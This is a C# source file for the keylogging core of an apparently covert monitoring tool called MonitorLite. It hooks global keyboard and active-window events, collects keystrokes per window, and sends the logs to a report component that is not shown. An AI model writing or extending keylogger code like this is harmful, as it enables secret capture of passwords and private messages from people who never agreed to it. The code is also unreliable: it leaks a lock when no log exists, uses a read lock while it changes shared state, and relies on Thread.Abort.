using MonitorLiteCommon;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MonitorLiteCore
{
    static class KeylogManager
    {
        private static WindowChangeMonitor windowChangeMonitor;
        private static KeyboardMonitor keyboardMonitor;

       
        private static Keylog _currentKeylog;
        private static Lock _currentKeylogLock;

        public static int MaxLogSize { get; set; }

        public static void Initialize()
        {

            _currentKeylogLock = Lock.Create();

            keyboardMonitor = new KeyboardMonitor();
            windowChangeMonitor = new WindowChangeMonitor();

            keyboardMonitor.OnKeyboardEvent += KeyboardMonitor_OnKeyboardEvent;
            windowChangeMonitor.OnWindowChangeEvent += WindowChangeMonitor_OnWindowChangeEvent;

        


        }

       
       
        private static void WindowChangeMonitor_OnWindowChangeEvent(object sender, WindowChangeMonitorEventArgs e)
        {
            _currentKeylogLock.EnterReadLock();
            if(_currentKeylog != null)
            {
                ReportManager.AppendToReport(_currentKeylog);
            }
            _currentKeylog = Keylog.Create(e);
            _currentKeylogLock.ExitReadLock();
            
        }

        private static void KeyboardMonitor_OnKeyboardEvent(object sender, KeyboardMonitorEventArgs e)
        {
            _currentKeylogLock.EnterWriteLock();
                      
            if (_currentKeylog == null)
            {
                return;
            }
            
            _currentKeylog.AppendKeyboardEvent(e);
            _currentKeylogLock.ExitWriteLock();
            //CurrentKeyLog.AppendKeyboardEvent(e);
        }

        public static Thread Start()
        {
           Thread t = new Thread(new ThreadStart(start));
            t.TrySetApartmentState(ApartmentState.STA);
            t.Start();
            return t;
        }

        private static void start()
        {
            try
            {
                windowChangeMonitor.Install();
                keyboardMonitor.Install();
                Application.Run();
            }
            catch(ThreadAbortException tae)
            {
                keyboardMonitor.Unistall();
                windowChangeMonitor.Unistall();
            }
        }

        public static void Stop(Thread t)
        {
            t.Abort();
            ReportManager.AppendToReport(null);
            
        }
    }
}
